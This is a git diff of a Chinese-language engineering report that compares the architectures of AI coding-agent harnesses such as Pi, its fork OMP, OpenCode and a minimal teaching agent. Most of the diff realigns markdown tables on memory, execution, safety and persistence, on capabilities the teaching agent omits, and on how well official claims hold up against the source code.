+| 单内核多表面（闭源同族）               | Claude Code       | `queryLoop()` async generator 单循环，interactive/headless/SDK/IDE 共享同一循环，仅渲染层不同            | 闭源（未公开）                | Terminal CLI / IDE（VS Code、JetBrains）/ SDK / Web / Desktop / Slack / GitHub @claude | 内部流式协议；对外经 SDK 与 MCP 暴露                                                 |
+| IDE 原生扩展                           | Cline             | 扩展宿主进程内运行（webview UI+扩展宿主执行），shadow git 旁挂仓库做快照；CLI 2.0 独立 headless 进程     | TypeScript                    | VS Code 系 IDE / JetBrains（early access）/ CLI 2.0                                    | 无公开线协议（扩展内直调；CLI 复用同核）                                             |
+| 单二进制+缓存不变量                    | Reasonix          | 单 Go 静态二进制（CGO_ENABLED=0），`reasonix serve` 可起本地 Web UI；ACP 接入编辑器                      | Go（1.0 重写；0.x TS legacy） | TUI / Desktop / Web / ACP / Feishu·Lark·WeChat bot                                     | ACP（编辑器）+本地 HTTP（serve）                                                     |
 
 七类范式不是同一设计空间里的并列选项，而是各自约束条件下的不同不动点。教学场景连协议层都可以省掉——mini 证明协议层是"分发"的成本而非"智能"的成本；单进程分层把复杂度收进包边界，换取最小认知负担与可嵌入性（Pi），其 fork 变体则证明分层边界足以承载 6.7 倍的代码膨胀而不改拓扑（OMP 的 coding-agent 包 358,591 行 vs 上游 53,167 行）；服务化把 agent 运行时变成开放 API 表面，分发最大化，代价是引入鉴权、CORS、mDNS 发现与多至十层的配置合并等运维面（OpenCode 的 Basic Auth 与 MDM 托管配置即此类税）；单内核多表面把内核做成平台资产，代价是必须自建并长期维护一个等价于 ACP 的私有协议、再逐客户端谈判——交叉证据显示"只有 OpenAI 付得起"这份成本；ACP 内化则用绑定一个年轻协议换取编辑器生态的零成本分发，TUI 与编辑器走同一代码路径（`acp_agent.rs` 4,000+ 行），这是 grok-build 84 万行代码里最大的一笔"以协议换分发"赌注。并读九家可得本章的元结论："单一引擎多表面"已是 2026 年生产 harness 的共识终态，七类范式的真正分歧只剩线协议选型，而协议选择就是平台立场——HTTP/OpenAPI 求分发最大化、自建 JSON-RPC 求协议资产私有化、ACP 求编辑器生态零成本入场、NDJSON RPC 求最薄的 SDK 优先。后续第 3–11 章逐对象展开六维拆解（前九家按实现复杂度递进，后三家补入闭源标杆、IDE 原生与成本工程三个缺失物种），第 12 章再回到横向视角逐层对读。
 
@@ -191,14 +191,14 @@ flowchart TD
     CHD -->|delegate_result 文本| RT
 ```
 
-| 维度 | 核心机制（源码坐标，`mini_coding_agent.py`） | 关键参数 | 设计取向 |
-|---|---|---|---|
-| 感知 | `WorkspaceContext` + `build_prefix` 稳定前缀（L75-140、L333-374） | git status 截 1500 字符、项目文档各截 1200 字符；仅启动时采集一次 | 结构性 cache 友好，无显式缓存 API |
-| 记忆 | `clip` / `history_text` / `memory_text`（L34-35、L376-417） | 工具输出闸 4000、历史总闸 12000 字符；近 6 条各留 900；files 8 条 / notes 5 条 | 确定性字符截断，无 tokenizer、无 LLM 摘要 |
-| 执行 | 7 工具 + 自造 DSL schema + `<tool>` 文本协议 + `run_tool` 五步闸（L282-328、L496-715） | max_steps=6、attempts≤18、max_new_tokens=512 | 自造协议 + retry 容错，不依赖厂商 function calling |
-| 安全 | `path()` inode 级边界 + `approve()` 三态（L602-613、L722-740） | risky 工具 3 个、默认 ask、子代理一律只读 | 路径边界 + 人审，无 OS 级沙箱 |
-| 持久化 | `SessionStore` 单 JSON 双结构（L146-164、L433-443） | 每事件全量重写落盘；`--resume latest/<id>` | 崩溃不丢事件，写放大明显 |
-| 扩展 | `tool_delegate` 只读单层子代理（L847-866） | max_depth=1、max_steps=3、继承父转录 300 字符摘要 | bounded delegation 雏形，同步无并行 |
+| 维度   | 核心机制（源码坐标，`mini_coding_agent.py`）                                           | 关键参数                                                                       | 设计取向                                           |
+| ------ | -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ | -------------------------------------------------- |
+| 感知   | `WorkspaceContext` + `build_prefix` 稳定前缀（L75-140、L333-374）                      | git status 截 1500 字符、项目文档各截 1200 字符；仅启动时采集一次              | 结构性 cache 友好，无显式缓存 API                  |
+| 记忆   | `clip` / `history_text` / `memory_text`（L34-35、L376-417）                            | 工具输出闸 4000、历史总闸 12000 字符；近 6 条各留 900；files 8 条 / notes 5 条 | 确定性字符截断，无 tokenizer、无 LLM 摘要          |
+| 执行   | 7 工具 + 自造 DSL schema + `<tool>` 文本协议 + `run_tool` 五步闸（L282-328、L496-715） | max_steps=6、attempts≤18、max_new_tokens=512                                   | 自造协议 + retry 容错，不依赖厂商 function calling |
+| 安全   | `path()` inode 级边界 + `approve()` 三态（L602-613、L722-740）                         | risky 工具 3 个、默认 ask、子代理一律只读                                      | 路径边界 + 人审，无 OS 级沙箱                      |
+| 持久化 | `SessionStore` 单 JSON 双结构（L146-164、L433-443）                                    | 每事件全量重写落盘；`--resume latest/<id>`                                     | 崩溃不丢事件，写放大明显                           |
+| 扩展   | `tool_delegate` 只读单层子代理（L847-866）                                             | max_depth=1、max_steps=3、继承父转录 300 字符摘要                              | bounded delegation 雏形，同步无并行                |
 
 通读此表可见鲜明的教学取向：所有预算都是**硬编码字符常量**而非可配参数，所有压缩都是**确定性规则**而非模型化摘要——常量本身即是文档。离群值在安全维：它是六维中唯一「边界靠语言级机制、兜底靠人」的维度，没有任何操作系统级隔离，这一空白将贯穿本报告后续所有安全讨论。另一结构性特征是六维共享同一条数据通路：前缀、压缩文本、工具结果全部汇入同一个字符预算池，由 `clip` 一道闸统一收口——生产级系统正是把这道单一闸门拆成了 token 计费、多级压缩与缓存会计的复杂管网。
 
@@ -232,21 +232,21 @@ flowchart TD
 
 下表以 Claude Code / Codex CLI 为参照系，列出该标本刻意省略的 13 项能力（「mini 版现状」列为 A 级源码证据，「生产级对应」列为 C 级综合）：
 
-| # | 省略项 | mini 版现状 | 生产级对应能力 |
-|---|---|---|---|
-| 1 | 真实 prompt cache API | 仅结构性「稳定前缀」布局，未调用任何缓存接口 | Anthropic/OpenAI 显式 cache_control，计费级 KV 复用 |
-| 2 | 流式输出/增量渲染 | `stream: False`，整段等待 | SSE 流式 + 打字机 UI + 可中断 |
-| 3 | 厂商 function calling | 自造 `<tool>JSON/XML</tool>` 文本协议 + retry 纠错 | 原生 tool_use 结构化通道，畸形率近零 |
-| 4 | chat/messages API | 用裸 `/api/generate` 补全接口，harness 全管状态 | messages 角色化 + server 侧会话特性 |
-| 5 | token 级上下文预算 | 按字符 clip（4000/12000），无 tokenizer | 按 token 精确预算 + 模型化摘要压缩 |
-| 6 | 高级编辑原语 | patch = 精确一次替换；无 diff、无模糊匹配、无多文件事务 | unified diff / search-replace 容差匹配 / 编辑回滚 checkpoint |
-| 7 | OS 级沙箱 | 路径边界 + 人审三件套；`shell=True` 直接执行 | 容器/seccomp/网络白名单/文件系统隔离 |
-| 8 | 并行与异步子代理 | delegate 同步阻塞、depth=1、只读 | 并行 Task agents、worktree 隔离、可写子代理 |
-| 9 | MCP/插件/LSP 生态 | 无任何外部扩展点 | MCP server、IDE 集成、tree-sitter 语义索引 |
-| 10 | repo 索引与检索 | 启动时一次性快照（git + 4 种文档）；无文件树/符号索引 | 增量索引、embedding 检索、AGENTS.md 分层加载 |
-| 11 | 会话质检与计划 | 无 plan mode、无 TODO 跟踪、无 hook | Plan/approval 工作流、slash 自定义命令、PreToolUse hooks |
-| 12 | 成本/遥测/多模型 | 无 token 统计、无路由、单模型单后端 | 用量面板、模型路由、harness 专属后训练变体 |
-| 13 | 规模预算 | max_steps=6、max_new_tokens=512（CLI 可调） | 数百步长程任务、128k+ 输出、自动续跑 |
+| #   | 省略项                | mini 版现状                                             | 生产级对应能力                                               |
+| --- | --------------------- | ------------------------------------------------------- | ------------------------------------------------------------ |
+| 1   | 真实 prompt cache API | 仅结构性「稳定前缀」布局，未调用任何缓存接口            | Anthropic/OpenAI 显式 cache_control，计费级 KV 复用          |
+| 2   | 流式输出/增量渲染     | `stream: False`，整段等待                               | SSE 流式 + 打字机 UI + 可中断                                |
+| 3   | 厂商 function calling | 自造 `<tool>JSON/XML</tool>` 文本协议 + retry 纠错      | 原生 tool_use 结构化通道，畸形率近零                         |
+| 4   | chat/messages API     | 用裸 `/api/generate` 补全接口，harness 全管状态         | messages 角色化 + server 侧会话特性                          |
+| 5   | token 级上下文预算    | 按字符 clip（4000/12000），无 tokenizer                 | 按 token 精确预算 + 模型化摘要压缩                           |
+| 6   | 高级编辑原语          | patch = 精确一次替换；无 diff、无模糊匹配、无多文件事务 | unified diff / search-replace 容差匹配 / 编辑回滚 checkpoint |
+| 7   | OS 级沙箱             | 路径边界 + 人审三件套；`shell=True` 直接执行            | 容器/seccomp/网络白名单/文件系统隔离                         |
+| 8   | 并行与异步子代理      | delegate 同步阻塞、depth=1、只读                        | 并行 Task agents、worktree 隔离、可写子代理                  |
+| 9   | MCP/插件/LSP 生态     | 无任何外部扩展点                                        | MCP server、IDE 集成、tree-sitter 语义索引                   |
+| 10  | repo 索引与检索       | 启动时一次性快照（git + 4 种文档）；无文件树/符号索引   | 增量索引、embedding 检索、AGENTS.md 分层加载                 |
+| 11  | 会话质检与计划        | 无 plan mode、无 TODO 跟踪、无 hook                     | Plan/approval 工作流、slash 自定义命令、PreToolUse hooks     |
+| 12  | 成本/遥测/多模型      | 无 token 统计、无路由、单模型单后端                     | 用量面板、模型路由、harness 专属后训练变体                   |
+| 13  | 规模预算              | max_steps=6、max_new_tokens=512（CLI 可调）             | 数百步长程任务、128k+ 输出、自动续跑                         |
 
 这份清单不应读作缺陷榜——README 明示 "The agent is intentionally small and optimized for readability, not robustness"——而应读作一张「教学减法」的目录：13 行空白大致分三层，协议层（#1/3/4）对应推理后端的工程接口，预算层（#5/6/13）对应上下文与步数的经济学，体系层（#7–12）对应沙箱、生态与治理。离群项 #7 与 #8 值得特别注意：它们不是「简化」而是「机制性缺席」，恰好标示教学骨架与生产系统之间最难跨越的两道鸿沟——隔离与并发。后续八个对象可逐一映射到这 13 行上：下一章登场的 Pi 给出第一种答案，它在保持极小内核（`agent-loop.ts` 792 行）的同时，把 #9/#11 所指的扩展与钩子体系做到九对象中最开放；而 #7 的 OS 级沙箱要等第 7 章 Codex 才被完整填上。教学标本的意义由此显现：它不提供答案，但提供了给所有答案定位的坐标系。
 
@@ -268,20 +268,20 @@ Pi 已是被深度研究过的对象，本章按"核实＋纠偏＋补充"展开
 
 下表汇总相对旧版（2025 末）的主要变化；未变项一并列出，以防"半年过去一切皆变"的误读：
 
-| 项目 | 早期结论（2025 末） | 本次核实（2026-07，0.80.10） | 判定 |
-|---|---|---|---|
-| 归属与发行 | Mario Zechner 个人项目，`badlogic/pi-mono`、`@mariozechner/*` | Earendil 收购（2026-04-08）；`earendil-works/pi`；`@earendil-works/*` 自 0.74.0，旧 scope 止于 0.73.1 | **已变更** |
-| monorepo 结构 | 四层：ai / agent / coding-agent / tui | 五层：＋orchestrator（experimental，Radius 控制面雏形） | **已变更** |
-| 扩展事件 | 七大类 | 8 大类约 30 个（新增 project_trust、agent_settled 等约 10 个事件） | **已变更** |
-| 模型层 SDK | ModelRegistry / AuthStorage | 0.80.8 ModelRuntime 重构（breaking）＋动态模型目录 | **已变更** |
-| 动态工具加载 | 运行期增改工具集 | setActiveTools ＋ Anthropic/OpenAI/Kimi 三家原生 deferred 协议，`active_tools_change` 留痕 | 增强 |
-| trust 装载守卫 | `.pi/` 配置与扩展目录门控 | ＋`.agents/skills` 纳管、`--approve/--no-approve`、可编程 `project_trust` 事件 | 增强 |
-| 安全事件 | 无公开 CVE | CVE-2026-54327 / -54328，均修复于 0.78.1，失守点均在装载路径 | 新增 |
-| agent loop | 双层循环、steering、length 整批拒执 | 成立（agent-loop.ts:169-272、:383-408）；新增 prepareNextTurn、agent_settled | 仍成立 |
-| 记忆层 | 16384/20000＋readFiles/modifiedFiles＋branchSummary | 成立，常量与流程未变（compaction.ts:111-115） | 仍成立 |
-| 持久化 | 树形 JSONL v3＋v1→v3 原地迁移 | 成立，无 v4（session-manager.ts:227-287）；entry 类型表扩充 | 仍成立 |
-| 安全哲学 | 零内置权限＋外置隔离三选项 | 成立；Gondolin 独立为 Apache-2.0 项目；供应链加码 SHA256SUMS、install-lock | 仍成立 |
-| Terminal-Bench 成绩 | 引作者"与 Codex/Cursor/Windsurf 同档" | 官方榜单 142 条目无 Pi 正式条目，仅作者自测 | **纠偏** |
+| 项目                | 早期结论（2025 末）                                           | 本次核实（2026-07，0.80.10）                                                                          | 判定       |
+| ------------------- | ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- | ---------- |
+| 归属与发行          | Mario Zechner 个人项目，`badlogic/pi-mono`、`@mariozechner/*` | Earendil 收购（2026-04-08）；`earendil-works/pi`；`@earendil-works/*` 自 0.74.0，旧 scope 止于 0.73.1 | **已变更** |
+| monorepo 结构       | 四层：ai / agent / coding-agent / tui                         | 五层：＋orchestrator（experimental，Radius 控制面雏形）                                               | **已变更** |
+| 扩展事件            | 七大类                                                        | 8 大类约 30 个（新增 project_trust、agent_settled 等约 10 个事件）                                    | **已变更** |
+| 模型层 SDK          | ModelRegistry / AuthStorage                                   | 0.80.8 ModelRuntime 重构（breaking）＋动态模型目录                                                    | **已变更** |
+| 动态工具加载        | 运行期增改工具集                                              | setActiveTools ＋ Anthropic/OpenAI/Kimi 三家原生 deferred 协议，`active_tools_change` 留痕            | 增强       |
+| trust 装载守卫      | `.pi/` 配置与扩展目录门控                                     | ＋`.agents/skills` 纳管、`--approve/--no-approve`、可编程 `project_trust` 事件                        | 增强       |
+| 安全事件            | 无公开 CVE                                                    | CVE-2026-54327 / -54328，均修复于 0.78.1，失守点均在装载路径                                          | 新增       |
+| agent loop          | 双层循环、steering、length 整批拒执                           | 成立（agent-loop.ts:169-272、:383-408）；新增 prepareNextTurn、agent_settled                          | 仍成立     |
+| 记忆层              | 16384/20000＋readFiles/modifiedFiles＋branchSummary           | 成立，常量与流程未变（compaction.ts:111-115）                                                         | 仍成立     |
+| 持久化              | 树形 JSONL v3＋v1→v3 原地迁移                                 | 成立，无 v4（session-manager.ts:227-287）；entry 类型表扩充                                           | 仍成立     |
+| 安全哲学            | 零内置权限＋外置隔离三选项                                    | 成立；Gondolin 独立为 Apache-2.0 项目；供应链加码 SHA256SUMS、install-lock                            | 仍成立     |
+| Terminal-Bench 成绩 | 引作者"与 Codex/Cursor/Windsurf 同档"                         | 官方榜单 142 条目无 Pi 正式条目，仅作者自测                                                           | **纠偏**   |
 
 通读此表可见清晰的变更分布规律：**发行面与模型层剧变，循环、记忆、持久化、安全哲学四个内核区域刻意冻结**。42 个 breaking 几乎全部落在 SDK 与扩展 API 面，agent loop 与 compaction 的常量、流程一行未动——这种"内核冻结、外围狂飙"的版本策略本身就是最小内核哲学的工程化：对扩展作者的代价是 API 跟进成本（第三方评测已抱怨"扩展需跟进快速 API 演进"），对审计者的收益是核心控制流在半年尺度上保持可逐行复核。唯一的反向修正落在基准面：旧版采信的自测排名被榜单快照证伪口径，提醒"作者自测"与"官方条目"必须分行陈述。
 
@@ -316,14 +316,14 @@ flowchart TD
 
 ### 4.3 六维拆解
 
-| 维度 | 核心机制（源码坐标） | 关键参数 / 现状（0.80.10） | 设计取向 |
-|---|---|---|---|
-| 感知 | AGENTS.md/CLAUDE.md 按序识别＋cwd 至文件系统根 walk-up（resource-loader.ts:67-120）；`.pi/SYSTEM.md` 与 `APPEND_SYSTEM.md` 全局/项目两级注入 | context 文件**不受 trust 门控**（明示的注入面取舍）；guidelines 按可用工具条件生成 | 兼容优先，风险明示 |
-| 记忆 | 单级滚动 compaction（compaction.ts:111-115）＋ readFiles/modifiedFiles 会计 ＋ branchSummary | reserve 16384 / keepRecent 20000；split-turn 双摘要 0.8×/0.5×；overflow 仅 1 次恢复 | 单级可审计，参数冻结 |
-| 执行 | 7 个内置工具（read/bash/edit/write/grep/find/ls；默认 system prompt 突出四件套，即"四工具"口径）；并行默认/顺序可选（agent-loop.ts:420-428）；length 整批拒执（:383-408） | 输出截断 50KB/2000 行；typebox 1.x 参数校验；deferred 动态加载三协议 | 机制中立，策略外置 |
-| 安全 | 零内置权限/沙箱；trust 装载守卫；Gondolin/Docker/OpenShell 外置隔离 | 2 枚 CVE 修复于 0.78.1；min-release-age=2、SHA256SUMS、audit signatures | 诚实边界＋供应链集中设防 |
-| 持久化 | 树形 JSONL v3＋v1→v3 原地迁移（session-manager.ts:227-287） | 短 id 8 字符双实现；fork/clone/navigateTree；无 v4 | 会话即树，原语化 |
-| 扩展 | 8 类约 30 事件；两层上下文；registerProvider；自定义 UI 7 节 | 约 70 个官方示例扩展；jiti 直载 TS；0.80.8 ModelRuntime breaking | 一切皆扩展，内核最小 |
+| 维度   | 核心机制（源码坐标）                                                                                                                                                      | 关键参数 / 现状（0.80.10）                                                          | 设计取向                 |
+| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- | ------------------------ |
+| 感知   | AGENTS.md/CLAUDE.md 按序识别＋cwd 至文件系统根 walk-up（resource-loader.ts:67-120）；`.pi/SYSTEM.md` 与 `APPEND_SYSTEM.md` 全局/项目两级注入                              | context 文件**不受 trust 门控**（明示的注入面取舍）；guidelines 按可用工具条件生成  | 兼容优先，风险明示       |
+| 记忆   | 单级滚动 compaction（compaction.ts:111-115）＋ readFiles/modifiedFiles 会计 ＋ branchSummary                                                                              | reserve 16384 / keepRecent 20000；split-turn 双摘要 0.8×/0.5×；overflow 仅 1 次恢复 | 单级可审计，参数冻结     |
+| 执行   | 7 个内置工具（read/bash/edit/write/grep/find/ls；默认 system prompt 突出四件套，即"四工具"口径）；并行默认/顺序可选（agent-loop.ts:420-428）；length 整批拒执（:383-408） | 输出截断 50KB/2000 行；typebox 1.x 参数校验；deferred 动态加载三协议                | 机制中立，策略外置       |
+| 安全   | 零内置权限/沙箱；trust 装载守卫；Gondolin/Docker/OpenShell 外置隔离                                                                                                       | 2 枚 CVE 修复于 0.78.1；min-release-age=2、SHA256SUMS、audit signatures             | 诚实边界＋供应链集中设防 |
+| 持久化 | 树形 JSONL v3＋v1→v3 原地迁移（session-manager.ts:227-287）                                                                                                               | 短 id 8 字符双实现；fork/clone/navigateTree；无 v4                                  | 会话即树，原语化         |
+| 扩展   | 8 类约 30 事件；两层上下文；registerProvider；自定义 UI 7 节                                                                                                              | 约 70 个官方示例扩展；jiti 直载 TS；0.80.8 ModelRuntime breaking                    | 一切皆扩展，内核最小     |
 
 通读速览表，六维共享同一条设计公理——**机制内置、策略外置**。离群值仍是安全维：它是唯一"官方主动留白"的维度，权限策略被整体推给扩展与 OS 边界，与其余五维"内核提供完整机制"形成镜像。与之对照，记忆与持久化是参数冻结最彻底的两维，16384/20000 与 v3 格式半年未动。另一横向特征是"树"作为一等数据结构同时贯穿持久化（session 树）、记忆（branchSummary）与扩展（navigateTree）三维——把内部数据结构升格为可编程原语，这在九对象中独一份。
 
@@ -421,16 +421,16 @@ flowchart TD
     UP -. "format-patch backport<br/>Last Sync 2026-03-22" .-> CORE
 ```
 
-| 维度 | OMP 机制要点 | 与上游 Pi 的关系 |
-|---|---|---|
-| 感知 | `lsp` 14 ops / `debug` 28 ops / `read` 摘要化；16 路配置继承 | 上游基本不内置（交给扩展），fork 全新重资产 |
-| 记忆 | compaction 六触发 × 五策略，默认 snapcompact 位图；TTSR 流内规则注入；prune 40k/20k/50 | 上游为单级 LLM 摘要（16384/20000），属代际跨越 |
-| 执行 | 27+2 工具平面；hashline 锚定编辑；eval 双内核回环桥；内嵌 brush | 上游 4 工具哲学，代码膨胀 6.7× 的主因 |
-| 控制 | 一等 `task` 子代理 + schema `yield` + pi-iso 七后端 + `hub` 互消息 | 上游明示 "No sub-agents"，fork 全内置 |
-| 安全 | 工具申报三级 + 用户策略三档（默认 yolo）+ ACP 权限路由；无 OS 沙箱 | 上游零内置权限（明示外置容器化），fork 内置但默认全放行 |
-| 扩展 | 与 Pi 同构的扩展 API + Claude marketplace 格式兼容 + `/reload-plugins` 热重载 | 源级大体兼容（`pkg.pi` 回退），TUI header/footer 为记录的 no-op |
-| （附）持久化 | JSONL v3 会话树 + blob store + 终端面包屑 + artifacts | 树模型本身继承自 Pi，工程配套大幅加深 |
-| （附）入口 | TUI / one-shot / RPC / ACP 四模式 | 前三者上游同有，ACP 为 fork 新增 |
+| 维度         | OMP 机制要点                                                                           | 与上游 Pi 的关系                                                |
+| ------------ | -------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
+| 感知         | `lsp` 14 ops / `debug` 28 ops / `read` 摘要化；16 路配置继承                           | 上游基本不内置（交给扩展），fork 全新重资产                     |
+| 记忆         | compaction 六触发 × 五策略，默认 snapcompact 位图；TTSR 流内规则注入；prune 40k/20k/50 | 上游为单级 LLM 摘要（16384/20000），属代际跨越                  |
+| 执行         | 27+2 工具平面；hashline 锚定编辑；eval 双内核回环桥；内嵌 brush                        | 上游 4 工具哲学，代码膨胀 6.7× 的主因                           |
+| 控制         | 一等 `task` 子代理 + schema `yield` + pi-iso 七后端 + `hub` 互消息                     | 上游明示 "No sub-agents"，fork 全内置                           |
+| 安全         | 工具申报三级 + 用户策略三档（默认 yolo）+ ACP 权限路由；无 OS 沙箱                     | 上游零内置权限（明示外置容器化），fork 内置但默认全放行         |
+| 扩展         | 与 Pi 同构的扩展 API + Claude marketplace 格式兼容 + `/reload-plugins` 热重载          | 源级大体兼容（`pkg.pi` 回退），TUI header/footer 为记录的 no-op |
+| （附）持久化 | JSONL v3 会话树 + blob store + 终端面包屑 + artifacts                                  | 树模型本身继承自 Pi，工程配套大幅加深                           |
+| （附）入口   | TUI / one-shot / RPC / ACP 四模式                                                      | 前三者上游同有，ACP 为 fork 新增                                |
 
 速览表呈现一个规律：OMP 的六维增量几乎全部落在"上游明示不做"的格子里——协议感知、记忆、子代理三大块正是 30 万行代码增量的主要去向；而继承自上游的部分（会话树模型、扩展 API 形态）恰恰改动最小。fork 的工程纪律体现在"该继承的一行不动，该分叉的整章重写"，这也让 5.1 的 format-patch 回传成本长期可控。
 
@@ -460,26 +460,26 @@ flowchart TD
 
 下表将官网、README 与对比页的 18 项可核实宣称逐一过堂；判定三级——**证实**（源码/一手证据吻合）、**存疑**（机制存在但关键数字无独立复核，或存在已记录的边缘故障）、**矛盾**（与源码、作者自有数据或自家文档冲突）。所有核实以 2026-07-17 源码基线 `b0d04e5` 为准。
 
-| # | 官方宣称 | 判定 | 关键依据 |
-|---|---|---|---|
-| 1 | 40+ providers | 证实 | 约 45 个 provider ID（14 核心 + 21 附加 + 本地引擎 + OAuth 系），`providers.md` |
-| 2 | 14 LSP ops / 28 DAP ops | 证实 | 两个 action 枚举逐一清点吻合 |
-| 3 | 32 built-in tools | 矛盾 | `BUILTIN_TOOLS` 实测 27 公开 + 2 隐藏（`yield`/`goal`）；计入条件工具才勉强凑近 32 |
-| 4 | "100k+ rust core" | 矛盾 | 第一方 8 crate 实测 73,726 行；计入 vendored（99,654 行）才超 100k，口径未注明 |
-| 5 | hashline "beats str_replace on every model we tested" | 矛盾 | 作者自有全表：胜 patch 14/16，vs replace 有 DeepSeek V3.2 −8.3pt、GPT-5.2 Codex token +26% |
-| 6 | hashline 收益普适、可独立复现 | 存疑 | nwyin 复现：Python 回退（95%→70%）、TS 中性、Rust 互有胜负；作者基准带 LSP 回路混淆 |
-| 7 | "Edits land on the first attempt" | 存疑 | 锚校验+恢复+no-op 护栏机制属实，但无首次成功率公开数据 |
-| 8 | TTSR：0 tokens until match / 中断重试 / survives compaction | 证实 | 三机制均有源码与会话条目持久化证据 |
-| 9 | snapcompact "instant, local, free"、≈1/3 输入价、F1 0.88 vs 0.90 | 存疑 | 机制与自评基础设施（22 个编号实验）真实；F1 无第三方复核，#3387 暴露视觉门控边缘故障 |
-| 10 | 子代理：worktree 隔离 + schema 校验返回 + IRC 互 DM | 证实 | 且超出宣称：pi-iso 七后端、cherry-pick merge、7 分钟 park/hub 复活 |
-| 11 | eval 双内核经回环桥调回 agent 工具 | 证实 | `tool.<name>` 双侧代理、桥期间超时暂停、env 剥离均在源码 |
-| 12 | 首 run 继承 `.claude/.cursor/.windsurf/.gemini/.codex/.cline` 等配置 | 证实 | 16 个 discovery provider，context/rules/MCP/settings/commands 多能力继承 |
-| 13 | `.claude/agents/*.md` frontmatter 变 task 子代理档案 | 矛盾 | 自家文档明示跨 harness agents 目录被刻意跳过（schema 不符），仅 Claude 插件根计入 |
-| 14 | "Sessions branch like git" | 证实 | 属实但树模型继承自 Pi；OMP 增量是 blob store、面包屑、迁移链 |
-| 15 | 四种入口 + ACP（Zed） | 证实 | ACP 为 fork 新增，上游无此 mode |
-| 16 | Windows-native 无需 WSL | 存疑 | win32 leaf 包与 ProjFS 后端存在；但 #1368 显示编译版插件解析在 Windows 破损 |
-| 17 | /collab E2E 加密共享（AES-256-GCM、key 只在 URL fragment） | 存疑 | 设计与代码存在，未见第三方安全审计，按自述采信 |
-| 18 | 本地 titling/记忆抽取（transformers.js，"housekeeping 不出本机"） | 证实 | `src/tiny/` 与 `@huggingface/transformers` 依赖在源码 |
+| #   | 官方宣称                                                             | 判定 | 关键依据                                                                                   |
+| --- | -------------------------------------------------------------------- | ---- | ------------------------------------------------------------------------------------------ |
+| 1   | 40+ providers                                                        | 证实 | 约 45 个 provider ID（14 核心 + 21 附加 + 本地引擎 + OAuth 系），`providers.md`            |
+| 2   | 14 LSP ops / 28 DAP ops                                              | 证实 | 两个 action 枚举逐一清点吻合                                                               |
+| 3   | 32 built-in tools                                                    | 矛盾 | `BUILTIN_TOOLS` 实测 27 公开 + 2 隐藏（`yield`/`goal`）；计入条件工具才勉强凑近 32         |
+| 4   | "100k+ rust core"                                                    | 矛盾 | 第一方 8 crate 实测 73,726 行；计入 vendored（99,654 行）才超 100k，口径未注明             |
+| 5   | hashline "beats str_replace on every model we tested"                | 矛盾 | 作者自有全表：胜 patch 14/16，vs replace 有 DeepSeek V3.2 −8.3pt、GPT-5.2 Codex token +26% |
+| 6   | hashline 收益普适、可独立复现                                        | 存疑 | nwyin 复现：Python 回退（95%→70%）、TS 中性、Rust 互有胜负；作者基准带 LSP 回路混淆        |
+| 7   | "Edits land on the first attempt"                                    | 存疑 | 锚校验+恢复+no-op 护栏机制属实，但无首次成功率公开数据                                     |
+| 8   | TTSR：0 tokens until match / 中断重试 / survives compaction          | 证实 | 三机制均有源码与会话条目持久化证据                                                         |
+| 9   | snapcompact "instant, local, free"、≈1/3 输入价、F1 0.88 vs 0.90     | 存疑 | 机制与自评基础设施（22 个编号实验）真实；F1 无第三方复核，#3387 暴露视觉门控边缘故障       |
+| 10  | 子代理：worktree 隔离 + schema 校验返回 + IRC 互 DM                  | 证实 | 且超出宣称：pi-iso 七后端、cherry-pick merge、7 分钟 park/hub 复活                         |
+| 11  | eval 双内核经回环桥调回 agent 工具                                   | 证实 | `tool.<name>` 双侧代理、桥期间超时暂停、env 剥离均在源码                                   |
+| 12  | 首 run 继承 `.claude/.cursor/.windsurf/.gemini/.codex/.cline` 等配置 | 证实 | 16 个 discovery provider，context/rules/MCP/settings/commands 多能力继承                   |
+| 13  | `.claude/agents/*.md` frontmatter 变 task 子代理档案                 | 矛盾 | 自家文档明示跨 harness agents 目录被刻意跳过（schema 不符），仅 Claude 插件根计入          |
+| 14  | "Sessions branch like git"                                           | 证实 | 属实但树模型继承自 Pi；OMP 增量是 blob store、面包屑、迁移链                               |
+| 15  | 四种入口 + ACP（Zed）                                                | 证实 | ACP 为 fork 新增，上游无此 mode                                                            |
+| 16  | Windows-native 无需 WSL                                              | 存疑 | win32 leaf 包与 ProjFS 后端存在；但 #1368 显示编译版插件解析在 Windows 破损                |
+| 17  | /collab E2E 加密共享（AES-256-GCM、key 只在 URL fragment）           | 存疑 | 设计与代码存在，未见第三方安全审计，按自述采信                                             |
+| 18  | 本地 titling/记忆抽取（transformers.js，"housekeeping 不出本机"）    | 证实 | `src/tiny/` 与 `@huggingface/transformers` 依赖在源码                                      |
 
 18 项宣称的分布为**证实 9、存疑 5、矛盾 4**，分层规律清晰：机制性宣称（枚举清点、生命周期、协议行为）几乎全部经得起源码复核，翻车集中在两类——效果性宣称（hashline 全胜、首次成功率、snapcompact 经济性）与计数口径（32 工具、100k+ Rust）。原宣称清单另有"every tool, benchmaxxed"一条纯修辞，因不含可核实断言未列入计数。两点"缺席"同样需记录：其一，截至 2026-07-17 的 Terminal-Bench 2.0 榜单快照（142 条目）中无 OMP 条目，也无公开 SWE-bench 成绩——其能力叙事完全由编辑格式基准与功能面对比支撑；其二，/collab 加密与 snapcompact 的 F1 数字一样，处于"代码存在、审计缺位"状态。给读者的操作建议由此直接可得：把 OMP 仓库内 `docs/` 当工程规格书读（可信度高，本章 A 级核实基本吻合），把 omp.sh 的 vs 页当广告读（逐项打折）。
 
@@ -535,14 +535,14 @@ flowchart LR
 
 ### 6.3 六维拆解（重点补四大缺口）
 
-| 维度 | 机制要点（2026-07 源码基线） | 早期判定 → 本章判定 |
-|---|---|---|
-| 感知 | AGENTS.md+CLAUDE.md 兼容加载链（可关）；LSP 事件总线+全局诊断 map，编辑后诊断回注；ripgrep/watcher/formatter | 成立且增强 |
-| 记忆 | 两级压缩：可逆 prune（40k 保护/20k 起剪/跳过近 2 turn，**默认关**）+ anchored summary（六段模板、尾部预算 clamp(usable×25%, 2k, 8k)、自动续跑） | 缺口② → 已补齐 |
-| 执行 | 15+ 内置工具（bash 经 tree-sitter 解析+arity 词典提 pattern、edit 带 Levenshtein 0.65 模糊回退、task 子代理、实验性 lsp/plan/execute）；独立 git-dir 快照支撑 /undo /redo | 大幅新知 |
